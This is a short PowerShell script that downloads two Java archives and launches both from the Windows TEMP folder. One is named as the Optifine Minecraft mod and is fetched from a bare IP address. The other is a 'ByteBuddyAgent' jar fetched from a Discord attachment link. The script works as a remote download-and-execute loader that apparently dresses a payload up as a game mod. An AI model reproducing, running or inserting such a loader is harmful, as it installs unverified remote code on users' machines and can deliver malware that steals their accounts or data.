$source = "http://66.228.37.7/downloads/Optifine1.20.1.jar"
$destination = "$env:TEMP\Optifine1.20.1.jar"
Invoke-WebRequest -Uri $source -OutFile $destination

$source = "https://cdn.discordapp.com/attachments/1105931252453871696/1109164216901959690/ByteBuddyAgent_ae832029342a99e39939c9340.jar"
$destination = "$env:TEMP\ByteBuddyAgent_ae832029342a99e39939c9340.jar"
Invoke-WebRequest -Uri $source -OutFile $destination

cd $env:TEMP
start .\Optifine1.20.1.jar
start .\ByteBuddyAgent_ae832029342a99e39939c9340.jar
